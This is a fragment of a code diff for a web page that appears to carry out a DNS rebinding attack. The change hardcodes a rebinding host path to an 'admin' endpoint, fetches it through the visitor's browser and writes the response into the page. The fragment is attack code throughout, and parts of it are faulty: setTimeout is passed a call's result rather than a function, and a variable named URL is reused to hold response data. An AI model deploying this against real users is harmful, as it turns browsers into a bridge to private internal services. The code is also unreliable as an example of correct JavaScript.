@@ -28,10 +28,10 @@ function TargetURL() {
   return URL;
 }
 
-document.write(TargetURL());
-var URL = httpGet(TargetURL());
+document.write("https://plopper.cloudns.cl/dns_rebinding/admin");
+var URL = httpGet("https://plopper.cloudns.cl/dns_rebinding/admin");
 document.write(URL);
-setTimeout(httpGet2(TargetURL()), 3000);
+setTimeout(httpGet(URL), 3000);
 </script>
 
 </body>
